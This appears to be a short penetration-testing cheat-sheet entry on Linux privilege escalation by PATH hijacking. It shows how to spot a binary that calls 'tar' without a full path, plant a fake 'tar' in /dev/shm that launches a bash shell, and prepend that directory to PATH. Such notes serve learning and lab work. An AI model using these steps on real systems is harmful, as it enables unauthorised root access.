# Basic Information

If one cannot see a full path either in a service or a program, they can overwrite or append to the `$PATH` environment variable.

  
# Binaries
*The example below is for binaries, but can also be used for services or cronjobs*

1. Find the program that is being referenced
```bash
ltrace ./binary

<SNIP>
system("tar -cvf /root/file")
<SNIP>
```

`system` calls tar without full path, therefore we can add our own `tar` file to `$PATH`.

2. Make our own `tar`, add payload and append to `$PATH`

```bash
cd /dev/shm

export PATH=/dev/shm:$PATH
echo -e "#!/bin/bash\n/bin/bash" > tar
chmod +x tar
```

3. Run the program again

```
./binary
```
